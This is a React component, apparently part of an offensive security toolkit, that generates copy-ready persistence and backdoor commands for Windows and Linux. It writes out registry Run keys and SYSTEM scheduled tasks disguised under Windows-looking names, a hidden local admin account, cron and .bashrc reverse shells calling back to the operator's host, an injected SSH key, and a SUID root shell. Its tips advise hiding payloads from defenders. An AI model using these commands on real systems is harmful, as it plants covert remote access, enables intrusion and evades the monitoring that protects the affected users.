import React, { useState } from 'react';
import { Shield, Terminal, Server, Clock, Key, UserPlus, Database, FileCode, ChevronDown, ChevronUp, CheckCircle2 } from 'lucide-react';
import { CopyButton } from '../../CopyButtons';

// ─── Props ────────────────────────────────────────────────────────
interface PersistenceProps {
    lhost: string;
    rhost: string;
}

// ─── Types ───────────────────────────────────────────────────────
type OSType = 'windows' | 'linux';

interface PersistenceMethod {
    id: string;
    label: string;
    icon: React.ReactNode;
    note: string;
    generateCmd: (lhost: string, lport: string, payloadPath: string, adminPass: string) => string;
}

// ─── Persistence Database ─────────────────────────────────────────
const METHODS: Record<OSType, PersistenceMethod[]> = {
    windows: [
        {
            id: 'reg-run',
            label: 'Registry Run Key',
            icon: <Database className="w-4 h-4 text-purple-400" />,
            note: 'Executes payload every time the user logs in.',
            generateCmd: (_, __, path) => `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdater" /t REG_SZ /d "${path}" /f`
        },
        {
            id: 'schtasks',
            label: 'Scheduled Task (System)',
            icon: <Clock className="w-4 h-4 text-purple-400" />,
            note: 'Creates a task running as SYSTEM (Requires Admin).',
            generateCmd: (_, __, path) => `schtasks /create /ru SYSTEM /sc onstart /tn "SecurityHealthService" /tr "${path}" /f`
        },
        {
            id: 'startup-folder',
            label: 'Startup Folder',
            icon: <FileCode className="w-4 h-4 text-purple-400" />,
            note: 'Drops the payload into the user\'s startup directory.',
            generateCmd: (_, __, path) => `copy "${path}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe"`
        },
        {
            id: 'local-admin',
            label: 'Add Local Admin',
            icon: <UserPlus className="w-4 h-4 text-purple-400" />,
            note: 'Creates a hidden user and adds them to Administrators.',
            generateCmd: (_, __, ___, pass) => `net user DefaultAccount$ ${pass || 'ComplexPass123!'} /add /Y & net localgroup administrators DefaultAccount$ /add`
        }
    ],
    linux: [
        {
            id: 'cron-revshell',
            label: 'Cronjob Reverse Shell',
            icon: <Clock className="w-4 h-4 text-purple-400" />,
            note: 'Pings back a bash reverse shell every minute.',
            generateCmd: (lh, lp) => `(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${lh}/${lp} 0>&1'") | crontab -`
        },
        {
            id: 'ssh-key',
            label: 'SSH Authorized Keys',
            icon: <Key className="w-4 h-4 text-purple-400" />,
            note: 'Adds your public key for passwordless SSH access.',
            generateCmd: () => `mkdir -p ~/.ssh; echo "ssh-rsa AAAAB3NzaC1yc... ATTACKER_PUB_KEY" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys`
        },
        {
            id: 'bashrc-alias',
            label: 'Bashrc Sudo Alias',
            icon: <Terminal className="w-4 h-4 text-purple-400" />,
            note: 'Intercepts sudo to spawn a background reverse shell.',
            generateCmd: (lh, lp) => `echo 'alias sudo="sudo -S bash -c \\"bash -i >& /dev/tcp/${lh}/${lp} 0>&1 &\\""' >> ~/.bashrc`
        },
        {
            id: 'suid-backdoor',
            label: 'SUID Bash Backdoor',
            icon: <Shield className="w-4 h-4 text-purple-400" />,
            note: 'WARNING: Unauthenticated SUID backdoor. Any local user can escalate to root.',
            generateCmd: () => `cp /bin/bash /var/tmp/.bash && chmod 4755 /var/tmp/.bash\n# Execute with: /var/tmp/.bash -p`
        }
    ]
};

const TIPS = [
    'Always verify your privileges before attempting system-wide persistence (e.g., HKLM Registry keys or SYSTEM Scheduled Tasks).',
    'Never hardcode default passwords in your backdoors. It opens the target to other threat actors and blue teams.',
    'For Windows, hiding your payload in standard paths like C:\\ProgramData or AppData makes it harder for defenders to spot.',
    'Linux Cronjob reverse shells can be noisy and easily detected by basic blue team monitoring.',
    'Adding users (net user / useradd) is highly visible in event logs. Use it only if stealth is not a priority.',
];

// ─── Component ────────────────────────────────────────────────────
export default function Persistence({ lhost }: PersistenceProps) {
    const [os, setOs] = useState<OSType>('windows');
    const [lport, setLport] = useState('4444');
    const [payloadPath, setPayloadPath] = useState('C:\\ProgramData\\update.exe');
    const [adminPass, setAdminPass] = useState('');
    const [showTips, setShowTips] = useState(false);

    const effectiveLhost = lhost || '10.10.X.X';

    const handleOsSwitch = (newOs: OSType) => {
        setOs(newOs);
        if (newOs === 'windows') setPayloadPath('C:\\ProgramData\\update.exe');
        else setPayloadPath('/tmp/.hidden_payload');
    };

    return (
        <div className="space-y-6">
            {/* ── Section Title ── */}
            <div className="flex items-center gap-3 pt-2">
                <div className="w-9 h-9 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
                    <Shield className="w-4 h-4 text-purple-400" />
                </div>
                <div>
                    <h3 className="text-lg font-bold text-white tracking-tight">System <span className="text-purple-400">Persistence</span></h3>
                    <p className="text-[11px] text-slate-500 font-mono">BACKDOORS & POST_EXPLOITATION</p>
                </div>
            </div>

            {/* ── Configuration ── */}
            <div className="bg-slate-900/50 border border-slate-800/50 rounded-2xl p-5 space-y-4">
                <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider">Listener & Payload Config</h4>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Callback Port (LPORT)</label>
                        <input
                            type="text"
                            value={lport}
                            onChange={e => setLport(e.target.value)}
                            placeholder="4444"
                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
                        />
                    </div>
                    <div>
                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Dropped Payload Path</label>
                        <input
                            type="text"
                            value={payloadPath}
                            onChange={e => setPayloadPath(e.target.value)}
                            placeholder={os === 'windows' ? 'C:\\path\\to\\payload.exe' : '/tmp/payload'}
                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
                        />
                    </div>
                    <div>
                        <label className="block text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-1.5">Backdoor Password</label>
                        <input
                            type="text"
                            value={adminPass}
                            onChange={e => setAdminPass(e.target.value)}
                            placeholder="Set a secure password..."
                            className="w-full bg-slate-900/70 border border-slate-700/60 rounded-xl px-4 py-3 text-sm font-mono text-purple-400 placeholder-slate-600 focus:outline-none focus:border-purple-500/50 focus:shadow-[0_0_15px_-4px_rgba(168,85,247,0.2)] transition-all"
                        />
                    </div>
                </div>
            </div>

            {/* ── OS Selector ── */}
            <div className="flex bg-slate-900/50 border border-slate-800/50 rounded-xl p-1 w-full max-w-md">
                <button
                    onClick={() => handleOsSwitch('windows')}
                    className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold font-mono transition-all ${os === 'windows'
                            ? 'bg-purple-500/20 text-purple-400 shadow-[0_0_10px_-2px_rgba(168,85,247,0.2)]'
                            : 'text-slate-500 hover:text-slate-300'
                        }`}
                >
                    <Server className="w-4 h-4" /> Windows
                </button>
                <button
                    onClick={() => handleOsSwitch('linux')}
                    className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold font-mono transition-all ${os === 'linux'
                            ? 'bg-purple-500/20 text-purple-400 shadow-[0_0_10px_-2px_rgba(168,85,247,0.2)]'
                            : 'text-slate-500 hover:text-slate-300'
                        }`}
                >
                    <Terminal className="w-4 h-4" /> Linux
                </button>
            </div>

            {/* ── Generated Commands ── */}
            <div className="space-y-4 animate-page-in">
                {METHODS[os].map((method) => {
                    const cmd = method.generateCmd(effectiveLhost, lport, payloadPath, adminPass);

                    return (
                        <div key={method.id} className="bg-[#0b0f19] border border-slate-800/50 rounded-xl overflow-hidden group/cmd transition-colors hover:border-purple-500/30">
                            <div className="bg-slate-900/80 px-4 py-3 border-b border-slate-800/60 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    {method.icon}
                                    <span className="text-sm font-bold font-mono text-purple-400/90">{method.label}</span>
                                </div>
                                <span className="text-[10px] text-slate-500 font-mono hidden sm:block">{method.note}</span>
                            </div>
                            <div className="p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                                <code className="text-xs font-mono text-green-400/90 break-all leading-relaxed whitespace-pre-wrap">
                                    {cmd}
                                </code>
                                <div className="flex-shrink-0 mt-2 sm:mt-0 self-end sm:self-auto">
                                    <CopyButton text={cmd} />
                                </div>
                            </div>
                        </div>
                    );
                })}
            </div>

            {/* ── Tips ── */}
            <div className="bg-slate-900/50 border border-slate-800/50 rounded-2xl overflow-hidden mb-6">
                <button
                    onClick={() => setShowTips(v => !v)}
                    className="w-full flex items-center justify-between px-5 py-4 hover:bg-slate-800/20 transition-colors cursor-pointer"
                >
                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider">Persistence Tips</h4>
                    {showTips ? <ChevronUp className="w-4 h-4 text-slate-500" /> : <ChevronDown className="w-4 h-4 text-slate-500" />}
                </button>
                {showTips && (
                    <div className="px-5 pb-5 space-y-2 animate-page-in">
                        {TIPS.map((tip, i) => (
                            <div key={i} className="flex items-start gap-3 bg-slate-900/30 border border-slate-800/30 rounded-xl p-4">
                                <CheckCircle2 className="w-3.5 h-3.5 text-purple-500/60 flex-shrink-0 mt-0.5" />
                                <p className="text-xs text-slate-400 leading-relaxed">{tip}</p>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}